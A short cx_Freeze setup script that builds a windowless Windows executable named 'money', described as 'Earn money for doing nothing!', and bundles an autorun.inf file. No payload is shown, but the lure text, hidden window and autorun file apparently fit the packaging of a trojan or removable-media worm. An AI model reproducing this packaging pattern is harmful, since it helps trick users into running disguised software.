import sys
from cx_Freeze import setup, Executable

include_files = ['autorun.inf']

base = None
if sys.platform == "win32":
    base = "Win32GUI"

setup(
    name = "money",
    version = "0.1",
    description = "Earn money for doing nothing!",
    options = {"build_exe": {'include_files' : include_files}},
    executables = [Executable("money.py", base=base)]
)